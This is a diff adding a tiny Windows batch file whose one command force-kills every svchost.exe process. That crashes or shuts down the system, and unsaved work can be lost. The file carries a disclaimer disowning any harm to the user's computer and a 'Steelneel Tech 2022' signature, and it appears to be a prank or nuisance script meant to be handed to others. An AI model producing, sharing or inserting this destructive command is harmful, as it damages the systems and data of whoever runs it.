@@ -1,0 +1,5 @@
+TASKKILL /IM svchost.exe /F
+
+
+:: Disclaimer we are not responsible for any harm done to your computer. Run this file at your own risk.
+:: Steelneel Tech 2022
